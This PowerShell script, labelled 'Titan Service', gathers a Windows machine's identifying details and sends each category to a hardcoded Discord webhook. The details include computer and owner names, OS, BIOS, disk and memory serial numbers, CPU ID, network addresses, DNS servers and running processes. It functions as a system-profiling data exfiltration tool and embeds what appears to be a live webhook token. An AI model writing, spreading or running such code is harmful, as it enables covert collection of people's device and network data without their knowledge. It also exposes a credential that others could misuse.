###############################################################################
# TS - Titan Service: Streamlined PC-Info-to-Discord Script (English)
# Sends only the specified 9 categories to Discord
###############################################################################

# 1) DISCORD WEBHOOK URL
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1321463940802416662/vEfq26I3sIET-oKyzZxFPKsY4NaZ3HWLv1yUxkd9og6eZTHgxanJo4lYxkXL3Atx9pXN"

# 2) FUNCTION TO SEND A MESSAGE TO DISCORD
function Send-DiscordMessage {
    param (
        [Parameter(Mandatory = $true)]
        [string] $Content
    )

    $jsonBody = @{ content = $Content } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $DiscordWebhookUrl `
                          -Method Post `
                          -Body $jsonBody `
                          -ContentType "application/json"
    }
    catch {
        Write-Host "Error sending to Discord: $($_.Exception.Message)" -ForegroundColor Red
    }
}

###############################################################################
# 3) SYSTEM BASICS
###############################################################################
Write-Host ">>> Sending System Basics to Discord ..."
try {
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
    $msgSystem = ">>> System Basics <<<`n"
    $msgSystem += "Computer Name:          $($computerSystem.Name)`n"
    $msgSystem += "Manufacturer:           $($computerSystem.Manufacturer)`n"
    $msgSystem += "Model:                  $($computerSystem.Model)`n"
    $msgSystem += "Primary Owner:          $($computerSystem.PrimaryOwnerName)`n"
    $msgSystem += "Domain/Workgroup:       $($computerSystem.Domain)`n"
    $msgSystem += "Total RAM (GB):         " + [Math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)

    Send-DiscordMessage -Content $msgSystem
}
catch {
    Send-DiscordMessage -Content "Error retrieving System Basics: $($_.Exception.Message)"
}

###############################################################################
# 4) OPERATING SYSTEM INFO
###############################################################################
Write-Host ">>> Sending Operating System Info to Discord ..."
try {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $msgOS = ">>> Operating System Info <<<`n"
    $msgOS += "Name:                   $($os.Caption)`n"
    $msgOS += "Version:                $($os.Version)`n"
    $msgOS += "Architecture:           $($os.OSArchitecture)`n"
    $msgOS += "Install Date:           $($os.InstallDate)`n"
    $msgOS += "Last Boot:              $($os.LastBootUpTime)`n"
    $msgOS += "Build Number:           $($os.BuildNumber)`n"
    $msgOS += "Registered User:        $($os.RegisteredUser)`n"
    $msgOS += "Serial Number (OS):     $($os.SerialNumber)"

    Send-DiscordMessage -Content $msgOS
}
catch {
    Send-DiscordMessage -Content "Error retrieving OS Info: $($_.Exception.Message)"
}

###############################################################################
# 5) CPU INFO
###############################################################################
Write-Host ">>> Sending CPU Info to Discord ..."
try {
    $cpuList = Get-CimInstance -ClassName Win32_Processor
    $msgCPU = ">>> CPU Info <<<`n"
    foreach ($cpu in $cpuList) {
        $msgCPU += "Name:                   $($cpu.Name)`n"
        $msgCPU += "Cores:                  $($cpu.NumberOfCores)`n"
        $msgCPU += "Logical Processors:     $($cpu.NumberOfLogicalProcessors)`n"
        $msgCPU += "Clock Speed (MHz):      $($cpu.MaxClockSpeed)`n"
        $msgCPU += "Processor ID:           $($cpu.ProcessorId)`n`n"
    }

    Send-DiscordMessage -Content $msgCPU
}
catch {
    Send-DiscordMessage -Content "Error retrieving CPU Info: $($_.Exception.Message)"
}

###############################################################################
# 6) BIOS INFO
###############################################################################
Write-Host ">>> Sending BIOS Info to Discord ..."
try {
    $bios = Get-CimInstance -ClassName Win32_BIOS
    $msgBIOS = ">>> BIOS Info <<<`n"
    $msgBIOS += "BIOS Version:           $($bios.SMBIOSBIOSVersion)`n"
    $msgBIOS += "Release Date:           $($bios.ReleaseDate)`n"
    $msgBIOS += "Manufacturer:           $($bios.Manufacturer)`n"
    $msgBIOS += "Serial Number (BIOS):   $($bios.SerialNumber)"

    Send-DiscordMessage -Content $msgBIOS
}
catch {
    Send-DiscordMessage -Content "Error retrieving BIOS Info: $($_.Exception.Message)"
}

###############################################################################
# 7) MEMORY INFO
###############################################################################
Write-Host ">>> Sending Memory Info to Discord ..."
try {
    $memModules = Get-CimInstance -ClassName Win32_PhysicalMemory
    $msgMemory = ">>> Memory Info <<<`n"
    $i = 1
    foreach ($mem in $memModules) {
        $msgMemory += "Memory Module #${i}:`n"
        $msgMemory += "  Capacity (GB):   " + [Math]::Round($mem.Capacity / 1GB, 2) + "`n"
        $msgMemory += "  Speed (MHz):     $($mem.Speed)`n"
        $msgMemory += "  Manufacturer:    $($mem.Manufacturer)`n"
        $msgMemory += "  Serial Number:   $($mem.SerialNumber)`n`n"
        $i++
    }

    Send-DiscordMessage -Content $msgMemory
}
catch {
    Send-DiscordMessage -Content "Error retrieving Memory Info: $($_.Exception.Message)"
}

###############################################################################
# 8) GPU INFO
###############################################################################
Write-Host ">>> Sending GPU Info to Discord ..."
try {
    $gpuList = Get-CimInstance -ClassName Win32_VideoController
    $msgGPU = ">>> GPU Info <<<`n"
    $j = 1
    foreach ($gpu in $gpuList) {
        $msgGPU += "GPU #${j}:`n"
        $msgGPU += "  Name:            $($gpu.Name)`n"
        $msgGPU += "  Memory (MB):     " + [Math]::Round($gpu.AdapterRAM / 1MB, 2) + "`n"
        $msgGPU += "  Driver Version:  $($gpu.DriverVersion)`n`n"
        $j++
    }

    Send-DiscordMessage -Content $msgGPU
}
catch {
    Send-DiscordMessage -Content "Error retrieving GPU Info: $($_.Exception.Message)"
}

###############################################################################
# 9) DRIVE INFO
###############################################################################
Write-Host ">>> Sending Drive Info to Discord ..."
try {
    # Physical Drives
    $diskDrives = Get-CimInstance -ClassName Win32_DiskDrive
    $msgDrives = ">>> Drive Info <<<`n`n"
    $msgDrives += "Physical Drives:`n"
    foreach ($drive in $diskDrives) {
        $msgDrives += "  Name:               $($drive.Name)`n"
        $msgDrives += "  Model:              $($drive.Model)`n"
        $msgDrives += "  Serial Number:      $($drive.SerialNumber)`n"
        $msgDrives += "  Interface:          $($drive.InterfaceType)`n"
        $msgDrives += ("  Capacity (GB):      " + [Math]::Round($drive.Size / 1GB, 2) + "`n`n")
    }

    # Logical Drives
    $logicalDrives = Get-CimInstance -ClassName Win32_LogicalDisk
    $msgDrives += "Logical Drives:`n"
    foreach ($lDrive in $logicalDrives) {
        $msgDrives += "  Drive:             $($lDrive.DeviceID)`n"
        $msgDrives += "  File System:       $($lDrive.FileSystem)`n"
        if ($lDrive.FreeSpace) {
            $msgDrives += ("  Free Space (GB):   " + [Math]::Round($lDrive.FreeSpace / 1GB, 2) + "`n")
        }
        if ($lDrive.Size) {
            $msgDrives += ("  Total Size (GB):   " + [Math]::Round($lDrive.Size / 1GB, 2) + "`n")
        }
        $msgDrives += "`n"
    }

    Send-DiscordMessage -Content $msgDrives
}
catch {
    Send-DiscordMessage -Content "Error retrieving Drive Info: $($_.Exception.Message)"
}

###############################################################################
# 10) NETWORK INFO
###############################################################################
Write-Host ">>> Sending Network Info to Discord ..."
try {
    $netAdapters = Get-NetIPConfiguration
    $msgNet = ">>> Network Info <<<`n"

    foreach ($adapter in $netAdapters) {
        $msgNet += "Adapter:               $($adapter.InterfaceAlias)`n"
        $ipv4 = $adapter.IPv4Address
        if ($ipv4) {
            $msgNet += "  IPv4 Address:        $($ipv4.IPAddress)`n"
            $msgNet += "  Subnet Mask:         $($ipv4.PrefixLength)`n"
        }
        $gw = $adapter.IPv4DefaultGateway
        if ($gw) {
            $msgNet += "  Gateway:             $($gw.NextHop)`n"
        }
        $dns = $adapter.DNSServer.ServerAddresses
        if ($dns) {
            $msgNet += "  DNS Server(s):       " + ($dns -join ", ") + "`n"
        }
        $msgNet += "`n"
    }

    Send-DiscordMessage -Content $msgNet
}
catch {
    Send-DiscordMessage -Content "Error retrieving Network Info: $($_.Exception.Message)"
}

###############################################################################
# 11) PROCESS INFO (ONLY 10 UNIQUE)
###############################################################################
Write-Host ">>> Sending Process Info (Only 10 unique) to Discord ..."
try {
    $uniqueProcesses = Get-Process | Group-Object -Property Name | Sort-Object -Property Name
    $uniqueProcesses = $uniqueProcesses | Select-Object -First 10

    $msgProcs = ">>> Process Info (Only 10 unique) <<<`n"
    foreach ($procGroup in $uniqueProcesses) {
        $msgProcs += "Name: $($procGroup.Name)  (Instances: $($procGroup.Count))`n"
    }

    Send-DiscordMessage -Content $msgProcs
}
catch {
    Send-DiscordMessage -Content "Error retrieving Process Info: $($_.Exception.Message)"
}

###############################################################################
# DONE
###############################################################################
Write-Host "TS: Done! Only the specified categories have been sent to Discord in English."
